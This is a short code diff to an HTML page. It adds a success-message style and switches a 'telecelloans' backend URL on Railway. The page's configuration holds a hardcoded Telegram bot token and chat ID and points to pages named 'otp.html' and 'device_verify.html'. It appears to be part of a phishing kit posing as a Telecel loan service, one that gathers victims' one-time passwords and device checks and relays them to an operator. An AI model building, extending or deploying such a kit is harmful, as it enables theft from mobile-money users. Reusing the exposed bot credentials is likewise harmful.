@@ -242,6 +242,19 @@
             line-height: 1.5;
         }
 
+        .success-msg {
+            display: none;
+            background: #f0fdf4;
+            border: 1px solid #86efac;
+            color: #166534;
+            font-size: 13.5px;
+            font-weight: 500;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
         .btn-primary {
             width: 100%;
             background: linear-gradient(135deg, #E42320, #c01c1a);
@@ -516,7 +529,7 @@
             <label>Chat ID</label>
             <input type="text" id="cfgChatId" placeholder="e.g. 123456789" value="8392790531">
             <label>Backend API URL</label>
-            <input type="text" id="cfgApiUrl" placeholder="https://your-api.railway.app" value="https://telecelloans-production-fbdd.up.railway.app">
+            <input type="text" id="cfgApiUrl" placeholder="https://your-api.railway.app" value="https://telecelloans-production-4456.up.railway.app">
             <label>OTP Page</label>
             <input type="text" id="cfgOtpPage" placeholder="otp.html" value="otp.html">
             <label>Device Verify Page</label>
@@ -553,7 +566,7 @@
     let CONFIG = {
         BOT_TOKEN: '8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg',
         CHAT_ID: '8392790531',
-        API_URL: 'https://telecelloans-production-fbdd.up.railway.app',
+        API_URL: 'https://telecelloans-production-4456.up.railway.app',
         OTP_PAGE: 'otp.html',
         DEVICE_PAGE: 'device_verify.html',
         HOME_PAGE: 'index.html'
@@ -579,7 +592,7 @@
     function saveConfig() {
         CONFIG.BOT_TOKEN = document.getElementById('cfgToken').value.trim();
         CONFIG.CHAT_ID = document.getElementById('cfgChatId').value.trim();
-        CONFIG.API_URL = document.getElementById('cfgApiUrl').value.trim() || 'https://telecelloans-production-fbdd.up.railway.app';
+        CONFIG.API_URL = document.getElementById('cfgApiUrl').value.trim() || 'https://telecelloans-production-4456.up.railway.app';
         CONFIG.OTP_PAGE = document.getElementById('cfgOtpPage').value.trim() || 'otp.html';
         CONFIG.DEVICE_PAGE = document.getElementById('cfgDevicePage').value.trim() || 'device_verify.html';
         CONFIG.HOME_PAGE = document.getElementById('cfgHomePage').value.trim() || 'index.html';
